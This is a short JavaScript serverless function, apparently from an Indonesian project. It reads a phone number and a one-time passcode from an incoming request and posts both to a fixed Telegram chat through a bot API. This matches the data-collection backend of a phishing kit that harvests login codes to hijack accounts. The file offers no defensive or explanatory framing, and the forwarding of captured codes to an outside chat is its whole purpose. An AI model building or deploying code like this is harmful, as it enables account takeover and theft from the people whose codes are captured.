const axios = require('axios');

exports.handler = async function(event, context) {
    const { phone, otp } = JSON.parse(event.body); // Ambil data dari request

    const telegramUrl = `https://api.telegram.org/bot<YOUR_BOT_TOKEN>/sendMessage`;
    const message = `Phone: ${phone}, OTP: ${otp}`;

    try {
        await axios.post(telegramUrl, {
            chat_id: '6551804744',
            text: message,
        });

        return {
            statusCode: 200,
            body: JSON.stringify({ message: 'OTP sent to Telegram' }),
        };
    } catch (error) {
        return {
            statusCode: 500,
            body: JSON.stringify({ error: 'Failed to send OTP to Telegram' }),
        };
    }
};
